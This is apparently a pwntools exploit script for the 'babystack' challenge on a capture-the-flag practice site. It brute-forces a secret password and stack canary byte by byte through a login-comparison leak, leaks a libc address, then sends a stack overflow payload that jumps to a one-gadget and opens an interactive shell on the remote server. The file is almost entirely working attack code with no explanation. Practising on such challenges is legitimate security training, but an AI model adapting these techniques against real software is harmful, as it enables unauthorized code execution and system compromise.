# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './babystack'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'chall.pwnable.tw'
port = '10205'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))


run(0)
passwd = ''
for j in range(16):
    for i in range(1, 256):
        sla(' ', '1')
        sla(':', passwd+p8(i))
        if ru('\n').find('Fai') == -1:
            #print(i)
            passwd += p8(i)
            sla(' ','1')
            break
print hexdump(passwd)
canary = passwd#[0:8][::-1] + passwd[8:16][::-1]
print hexdump(canary)
sla(' ', '1')
sea(':', '\x00'+'a'*0x4f)
sla(' ', '3')
sea(':', '1'*0x30)
# dbg('breakrva 0xfc1')
sla(' ', '1')
# sla(' ', '1')
# sea(':', '1'*0x30)
passwd = 'a' * 0x10 + '1'
# pause()
for j in range(5):
    for i in range(1, 256):
        sla(' ', '1')
        sla(':', passwd+p8(i))
        if ru('\n').find('Fai') == -1:
            #print(i)
            passwd += p8(i)
            sla(' ','1')
            break
libc.address = un64(passwd[0x10:0x10 + 6])-0x3b7a31
print hex(libc.address)

'''
sla(' ', '1')
sea(' ', '\x00'+p64(libc.address +0x45216) * 15)
sla(' ', '3')
dbg('breakrva 0xebb')
sea(':', '1' * 0x31)
'''
sla(' ', '1')
payload = '\x00'.ljust(0x80 - 8 * 8, '2') + canary
payload += 'a' * 0x18
payload += p64(libc.address +0x45216)
sea(' ', payload)
sla(' ', '3')
dbg('breakrva 0xFf1')
sea('Copy :', '3')
sla(' ', '2')
print hexdump(canary)
# dbg()

shell()
# print hexdump(passwd)
